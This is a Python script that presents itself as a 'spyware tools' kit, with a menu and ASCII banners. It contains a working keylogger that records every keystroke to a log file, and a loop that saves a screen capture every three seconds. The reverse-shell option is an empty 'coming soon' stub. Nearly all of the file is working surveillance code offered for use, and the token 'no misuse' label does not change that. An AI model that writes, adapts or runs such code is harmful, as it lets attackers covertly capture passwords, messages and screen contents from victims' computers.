import socket
import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import pyautogui
import schedule
import time

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def logo():
    print(TextColors.WHITE + """
 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝ 
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║ 악용금지 X
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ spyware tools
          """ + TextColors.RESET)

logo()

def menu():
    print(TextColors.WHITE + "----------------SPYWARE MENU-----------------" + TextColors.RESET)
    print(TextColors.WHITE + "[1] KEY LOGGER" + TextColors.RESET)
    print(TextColors.WHITE + "[2] MONITOR SCREENSHOT" + TextColors.RESET)
    print(TextColors.WHITE + "[3] REVERSE SHELL" + TextColors.RESET)
    print(TextColors.WHITE + "----------------SPYWARE MENU----------------- \n" + TextColors.RESET)

menu()

select = input(TextColors.GREEN + "anonymous_root:~$ : " + TextColors.RESET)

import os
import logging
from pynput.keyboard import Listener

if select in ["1", "KEY LOGGER"]:
    def LogHunter_logo():
        print("""
██╗  ██╗███████╗██╗   ██╗    ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝     ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝      ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗  
██║  ██╗███████╗   ██║       ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
        """)
    print("[*] KEY LOGGER START..")

    def setup_logging():
        log_dir = r"C:\Users\USER\Downloads\log"
        log_file = os.path.join(log_dir, "3.0")
        
        os.makedirs(log_dir, exist_ok=True)
        
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    buffer = []

    min_length = input("[+] ENTER THE LENGTH OF CHARACTERS FOR LOGGING : ")
    if not min_length.isdigit():
        min_length = 10  
    else:
        min_length = int(min_length)

    def on_press(key):
        global buffer

        try:
            key_str = f'{key.char}'
        except AttributeError:
            key_str = f'{key}'
        
        buffer.append(key_str)

        if len(''.join(buffer)) >= min_length:
            log_str = ''.join(buffer)
            logging.info(log_str)
            print(f"[+] TERMINAL LOG 👀 : {log_str}")
            buffer.clear()

    def start_keylogger():
        setup_logging()
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[+] bye bye :( .")

    LogHunter_logo()
    start_keylogger()


elif select in ["2", "MONITOR SCREENSHOT"]:
    print("""
███████╗████████████╗█████████████████╗   ███████████╗  ██╗██████╗████████╗
██╔════██╔════██╔══████╔════██╔════████╗  ████╔════██║  ████╔═══██╚══██╔══╝
█████████║    ██████╔█████╗ █████╗ ██╔██╗ ██████████████████║   ██║  ██║   
╚════████║    ██╔══████╔══╝ ██╔══╝ ██║╚██╗██╚════████╔══████║   ██║  ██║  
███████╚████████║  ██████████████████║ ╚█████████████║  ██╚██████╔╝  ██║   
╚══════╝╚═════╚═╝  ╚═╚══════╚══════╚═╝  ╚═══╚══════╚═╝  ╚═╝╚═════╝   ╚═╝
""")
    print("[*] SCREENSHOT START...")

    save_path = input("[+] ENTER THE SCREENSHOT PATH : ")
    if not save_path:
        save_path = os.path.join(os.path.expanduser("~"), "Screenshots")
        
    if not os.path.exists(save_path):
        os.makedirs(save_path)

    def capture_screenshot(filename):
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"Screenshot saved as {filename}")

    def job():
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(save_path, f"I SEE YOU {timestamp}.png")
        capture_screenshot(filename)

    schedule.every(3).seconds.do(job)

    while True:
        schedule.run_pending()
        time.sleep(1)

elif select in ["3", "REVERSE SHELL"]:
    print("COMING SOON...")
    

